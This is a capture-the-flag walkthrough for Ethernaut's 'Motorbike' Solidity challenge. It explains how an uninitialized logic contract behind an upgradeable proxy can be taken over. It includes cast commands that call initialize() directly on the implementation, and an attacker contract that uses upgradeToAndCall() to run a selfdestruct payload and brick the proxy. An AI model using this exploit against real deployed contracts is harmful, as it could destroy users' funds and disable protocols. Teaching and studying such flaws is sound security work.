# Ethernaut Walkthrough: Motorbike
## Welcome to KweenBirb's 26th installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to Motorbike.sol, the 26th challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in the root directory and .sol file in the ./src directory. Let's begin!

In this challenge, Ethernaut gives us yet another upgradeable proxy pattern contract, this time asking us to 'selfdestruct its engine and make the motorbike unusable'

This challenge features a proxy just like the last challenge: Puzzle-Wallet, go check it out if you haven't already as this challenge will make a lot more sense having gone through that one. I actually just recently read of the exploit dubbed "explodingKittens" that thankfully was discovered before any damage could be done. It's a severe vulnerability that could have been abused to brick tens (possibly hundreds) of millions of dollars. Funny enough, while solving the previous challenge I was at first convinced we would need to explode some kittens, only belatedly realizing it was a much simpler storage overlap situation. This challenge however looks prime for exploding some kittens!

The 2021 ExplodingKittens exploit is premised on the fact that many upgradeable proxy contracts possess their upgrade logic in the logic implementation contract and that calls are delegatecalled via a fallback function. This proxy pattern, while immensely useful, can be terribly disastrous if a dapp does not take care to initialize its logic implementation contract (logic implementation contracts' initialize function must be manually invoked, unlike constructors). In such a case, an attacker may be able to gain permissioned access within a logic contract and maneuver laterally within to wreak other havoc.

So, let's see if we can't bypass the proxy entirely and call the initialize function on the logic implementation contract itself.

First let's locate the target logic implementation contract. There are a variety of ways to do this, via some sleuthing on Etherscan, using OpenZeppelin's awesome library of nifty proxy functions, or using Foundry's cast storage command. 

Personally I chose to use Foundry for this, but if you're more comfortable using Javascript I included that approach as well.

## Foundry's cast storage command

Remember that all storage variables and bytecode are ALWAYS public on-chain. There is nowhere to hide. Since we have the Motorbike's source code via Ethernaut, all we need to do is read from the storage slot termed _IMPLEMENTATION_SLOT (assigned 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc) specified at the top of the contract.

```cast storage $your_ethernaut_instance 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc```

Where $your_ethernaut_instance is set by a simple export:

```export instance=0xd00d00beefb00b```

## The OpenZeppelin JS option

If you go the OpenZeppelin route, a short js script will do the trick:

```
import {getImplementationAddress} from '@openzeppelin/upgrades-core'
const targetImpl = await getImplementationAddress(provider, proxyAddress)
```

Where your proxyAddress would be $your_ethernaut_instance and the provider would be easily set using the Ethers library. I've included the completed js script is in the ```script``` directory of this repo; it uses the common ethers js framework as well as the ever-useful dotenv library to establish a connection to Rinkeby via Infura.

When we run our nifty getImplementation.js script, a target address is returned to us in the console:

![Script Output](https://github.com/robriks/ethernaut-solutions/blob/main/motorbike/script/result.png)

## Once we've identified the logic implementation contract address

Looking back at the proxy, we see that the proxy contract is initialized in the proxy constructor:

```
    (bool success,) = _logic.delegatecall(
        abi.encodeWithSignature("initialize()")
    );
    require(success, "Call failed");
```

But there's no call to initialize the logic contract in sight! To be sure, let's run some quick checks to see if the logic implementation is initialized:

```cast call $IMPL --rpc-url $RPC "upgrader():(address)"```
```cast call $IMPL --rpc-url $RPC "horsePower():(uint256)"```

0 all around!? QUICK, CALL INITIALIZE() BEFORE SOME OTHER H4CK3R DOES! (or, as we are about to do, write it into a malicious contract for the element of surprise ;) )

```cast send --private-key $PRIV_KEY $IMPL --rpc-url $RPC "initialize()"```

Howly h00ts, I'M IN!!! 😈😈😈😈😈

PWND! With upgrader set to h4xz0r KweenBirb's address, we can now call upgradeToAndCall() to set a logic implementation 'engine' with a selfdestruct() function for the original logic implementation 'engine' to call! Teehee, we're gonna blow this Motorbike Engine to smithereens and set all the funds involved on 🔥🔥🔥fire🔥🔥🔥!

That way, once the Engine contract is selfdestructed, the proxy contract will be bricked, stuck calling an empty contract for its functions. The only way our plan could be foiled is if the delegatecall architecture checks for extcodesize() to prevent this. Looking at the _delegate fallback, we can see indiscriminate delegatecall assembly handling every call forwarded to the fallback function:

```
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
```

Aaaaand no extcodesize() logic to save the proxy if we brick it. Perfect.

## Let's get cracking, shall we?

Let's format a malicious contract function invoking selfdestruct():

```
function payload() public {
        selfdestruct(0x000000000000000000000000000000000000dEaD);
    }
```

And then invoke it using the Engine's convenient function intended for the proxy Motorbike to both set a new implementation and presumably initialize it in a single transaction. Of course, we'll be setting things on fire instead.

```
function sugarInYourEngine() public {
        // become upgrader by initializing logic engine
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("payload()"));
    }
```

With that, all we need to do is deploy our malicious contract and call sugarInYourEngine() to clog and explode the engine of Ethernaut's Motorbike. Pretty rude, if you ask me. But it had to be done.
○•○ h00t h00t ○•○
